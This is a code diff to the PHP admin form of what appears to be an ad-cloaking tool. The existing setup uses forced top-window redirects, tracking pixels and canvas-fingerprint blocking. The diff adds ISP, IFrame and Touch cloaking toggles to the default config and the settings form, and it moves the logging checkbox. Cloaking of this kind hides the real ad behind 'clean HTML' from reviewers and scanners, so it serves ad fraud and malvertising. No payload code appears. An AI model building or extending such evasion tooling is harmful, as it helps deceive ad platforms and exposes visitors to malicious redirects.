@@ -108,7 +108,13 @@
 	else
 	{
 		$currentAd = array("campaignID" 	=> "", 
-				   		   "configArray" 	=> array("Method" => "windowtoplocation", "TrackingPixelEnabled" => "true", "OutputMethod" => "HTML", "CanvasFingerprintCheckEnabled" => "false"), 
+				   		   "configArray" 	=> array("Method" => "windowtoplocation", 
+				   		   							 "TrackingPixelEnabled" => "true", 
+				   		   							 "OutputMethod" => "HTML", 
+				   		   							 "CanvasFingerprintCheckEnabled" => "false",
+				   		   							 "ISPCloakingEnabled" => "true",
+				   		   							 "IFrameCloakingEnabled" => "true",
+				   		   							 "TouchCloakingEnabled" => "true"),
 				   		   "cleanHtml" 		=> "<html>\n<head>\n\t{script}\n</head>\n<body{onload}>\n</body>\n</html>");
 	}
 
@@ -250,14 +256,6 @@
 			</tr>			
 
 			<tr>
-				<td>Logging Enabled</td>
-				<td>
-					<input type="hidden" name="LoggingEnabled" value="false" />
-					<input class="form-check-input" type="checkbox" name="LoggingEnabled" value="true" <?= (array_get_bool($currentAd["configArray"], "LoggingEnabled") ? "checked=checked" : null); ?> />
-				</td>
-			</tr>
-
-			<tr>
 				<td>Output Method</td>
 				<td>
 					<select name="OutputMethod" class="form-control">
@@ -289,7 +287,39 @@
 			<tr>
 				<td>Blocked Canvas Fingerprints (comma separated)</td>
 				<td><input type="text" name="BlockedCanvasFingerprints" class="form-control form-control-lg" value="<?= array_get_value_with_default($currentAd["configArray"], "BlockedCanvasFingerprints"); ?>" /></td>
-			</tr>			
+			</tr>
+
+			<tr>
+				<td>Logging Enabled</td>
+				<td>
+					<input type="hidden" name="LoggingEnabled" value="false" />
+					<input class="form-check-input" type="checkbox" name="LoggingEnabled" value="true" <?= (array_get_bool($currentAd["configArray"], "LoggingEnabled") ? "checked=checked" : null); ?> />
+				</td>
+			</tr>
+
+			<tr>
+				<td>ISP Cloaking Enabled</td>
+				<td>
+					<input type="hidden" name="ISPCloakingEnabled" value="false" />
+					<input class="form-check-input" type="checkbox" name="ISPCloakingEnabled" value="true" <?= (array_get_bool($currentAd["configArray"], "ISPCloakingEnabled") ? "checked=checked" : null); ?> />
+				</td>
+			</tr>
+
+			<tr>
+				<td>IFrame Cloaking Enabled</td>
+				<td>
+					<input type="hidden" name="IFrameCloakingEnabled" value="false" />
+					<input class="form-check-input" type="checkbox" name="IFrameCloakingEnabled" value="true" <?= (array_get_bool($currentAd["configArray"], "IFrameCloakingEnabled") ? "checked=checked" : null); ?> />
+				</td>
+			</tr>
+
+			<tr>
+				<td>Touch Cloaking Enabled</td>
+				<td>
+					<input type="hidden" name="TouchCloakingEnabled" value="false" />
+					<input class="form-check-input" type="checkbox" name="TouchCloakingEnabled" value="true" <?= (array_get_bool($currentAd["configArray"], "TouchCloakingEnabled") ? "checked=checked" : null); ?> />
+				</td>
+			</tr>
 
 			<tr>
 				<td colspan="2">Clean HTML code. Use placeholders {script}, {onload} and {queryString}.</td>
